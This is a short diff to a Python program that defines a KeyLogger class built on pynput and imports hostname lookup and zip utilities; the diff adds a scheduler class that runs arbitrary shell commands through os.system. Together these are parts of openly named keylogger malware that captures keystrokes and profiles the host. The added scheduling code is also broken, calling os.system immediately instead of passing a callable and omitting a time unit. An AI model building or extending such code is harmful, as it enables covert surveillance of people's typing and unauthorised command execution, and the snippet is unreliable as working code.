@@ -11,6 +11,7 @@ import platform
 import time
 import zipfile
 import os
+import schedule
 from typing import List
 from pynput import keyboard
 from socket import gethostname, gethostbyname
@@ -42,6 +43,18 @@ class KeyLogger:
         """stops listener"""
         global listener
         listener.stop()
+
+class ScheduleManagement:
+    listOfSchedules = []
+    def __init__(self,second,scheduleName,command):
+        self.second = second
+        self.scheduleName = scheduleName
+        self.command = command
+        self.listOfSchedules.append(self.scheduleName)
+    
+    def startSchedule(self):
+        schedule.every(self.second).do(os.system(self.command))
+
 
 
 def get_current_epoc_time() -> float:
